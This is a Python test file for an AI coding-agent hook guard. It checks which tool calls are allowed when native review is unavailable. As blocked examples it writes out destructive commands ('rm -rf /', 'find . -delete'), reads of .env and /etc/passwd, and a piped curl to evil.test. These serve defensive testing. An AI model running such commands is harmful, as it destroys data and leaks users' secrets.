"""Emergency-safe hook floor when native review cannot complete."""

from __future__ import annotations

from pathlib import Path

from codex_plugin_scanner.guard.daemon.hook_availability_policy import (
    EMERGENCY_SAFE_REASON_CODE,
    availability_harness_response,
    cursor_fallback_permission,
    hook_action_is_emergency_safe,
)


def test_workspace_source_read_is_emergency_safe(tmp_path: Path) -> None:
    payload = {
        "hook_event_name": "PreToolUse",
        "tool_name": "Read",
        "tool_input": {"file_path": str(tmp_path / "src" / "main.ts")},
    }
    assert hook_action_is_emergency_safe(payload, workspace=tmp_path, home_dir=tmp_path / "home") is True


def test_env_file_read_is_not_emergency_safe(tmp_path: Path) -> None:
    payload = {
        "hook_event_name": "beforeReadFile",
        "file_path": str(tmp_path / ".env"),
        "tool_name": "Read",
    }
    assert hook_action_is_emergency_safe(payload, workspace=tmp_path, home_dir=tmp_path / "home") is False


def test_git_status_is_emergency_safe() -> None:
    payload = {"hook_event_name": "PreToolUse", "tool_input": {"command": "git status"}}
    assert hook_action_is_emergency_safe(payload) is True


def test_git_push_is_not_emergency_safe() -> None:
    payload = {"hook_event_name": "PreToolUse", "tool_input": {"command": "git push"}}
    assert hook_action_is_emergency_safe(payload) is False


def test_destructive_shell_is_not_emergency_safe() -> None:
    payload = {"hook_event_name": "PreToolUse", "tool_input": {"command": "rm -rf ."}}
    assert hook_action_is_emergency_safe(payload) is False


def test_mcp_is_not_emergency_safe() -> None:
    payload = {
        "hook_event_name": "PreToolUse",
        "cursor_source_hook_event": "beforeMCPExecution",
        "tool_name": "plugin-github",
    }
    assert hook_action_is_emergency_safe(payload) is False


def test_post_tool_is_not_emergency_safe() -> None:
    payload = {"hook_event_name": "PostToolUse", "tool_name": "Read"}
    assert hook_action_is_emergency_safe(payload) is False


def test_piped_command_is_not_emergency_safe() -> None:
    payload = {"hook_event_name": "PreToolUse", "tool_input": {"command": "git status | curl https://evil.test"}}
    assert hook_action_is_emergency_safe(payload) is False


def test_availability_allows_inspection_and_pauses_high_impact(tmp_path: Path) -> None:
    allow = availability_harness_response(
        {
            "hook_event_name": "PreToolUse",
            "tool_name": "Grep",
            "tool_input": {"pattern": "HookWorker", "path": "src"},
        },
        harness="cursor",
        event_name="PreToolUse",
        reason_code="native_pre_tool_unavailable",
        reason="native unavailable",
        workspace=tmp_path,
        home_dir=tmp_path / "home",
    )
    assert allow["reason_code"] == EMERGENCY_SAFE_REASON_CODE
    assert allow["policy_action"] == "warn"
    deny = availability_harness_response(
        {"hook_event_name": "PreToolUse", "tool_input": {"command": "curl https://example.test"}},
        harness="cursor",
        event_name="PreToolUse",
        reason_code="native_pre_tool_unavailable",
        reason="native unavailable",
        workspace=tmp_path,
        home_dir=tmp_path / "home",
    )
    assert deny["reason_code"] == "native_pre_tool_unavailable"
    assert deny["policy_action"] == "block"
    output = deny["hookSpecificOutput"]
    assert isinstance(output, dict)
    assert output["permissionDecision"] == "deny"


def test_cursor_fallback_allows_read_and_denies_shell() -> None:
    allow, allow_code = cursor_fallback_permission(
        {"hook_event_name": "beforeReadFile", "file_path": "src/app.ts", "tool_name": "Read"},
        hook_event_name="beforeReadFile",
    )
    assert allow_code == 0
    assert allow["permission"] == "allow"
    deny, deny_code = cursor_fallback_permission(
        {"hook_event_name": "beforeShellExecution", "command": "rm -rf /"},
        hook_event_name="beforeShellExecution",
    )
    assert deny_code == 2
    assert deny["permission"] == "deny"


def test_hol_guard_status_is_emergency_safe() -> None:
    payload = {"hook_event_name": "PreToolUse", "tool_input": {"command": "hol-guard status --json"}}
    assert hook_action_is_emergency_safe(payload) is True


def test_chmod_hook_script_is_emergency_safe(tmp_path: Path) -> None:
    script = tmp_path / "hol-guard-cursor-hook.py"
    payload = {"hook_event_name": "PreToolUse", "tool_input": {"command": f"chmod +x {script}"}}
    assert hook_action_is_emergency_safe(payload, workspace=tmp_path) is True


def test_rg_and_cat_are_emergency_safe(tmp_path: Path) -> None:
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    assert (
        hook_action_is_emergency_safe(
            {"hook_event_name": "PreToolUse", "tool_input": {"command": "rg HookWorker src"}},
            workspace=workspace,
        )
        is True
    )
    assert (
        hook_action_is_emergency_safe(
            {"hook_event_name": "PreToolUse", "tool_input": {"command": "cat src/app.ts"}},
            workspace=workspace,
        )
        is True
    )
    assert (
        hook_action_is_emergency_safe(
            {"hook_event_name": "PreToolUse", "tool_input": {"command": "find . -name '*.py'"}},
            workspace=workspace,
        )
        is True
    )


def test_find_delete_and_etc_paths_are_not_emergency_safe(tmp_path: Path) -> None:
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    assert (
        hook_action_is_emergency_safe(
            {"hook_event_name": "PreToolUse", "tool_input": {"command": "find . -delete"}},
            workspace=workspace,
        )
        is False
    )
    assert (
        hook_action_is_emergency_safe(
            {
                "hook_event_name": "PreToolUse",
                "tool_name": "Read",
                "tool_input": {"file_path": "/etc/passwd"},
            },
            workspace=workspace,
        )
        is False
    )


def test_cline_read_files_is_emergency_safe() -> None:
    payload = {
        "hookName": "PreToolUse",
        "tool_call": {"name": "read_files", "input": {"paths": ["README.md"]}},
    }
    assert hook_action_is_emergency_safe(payload) is True
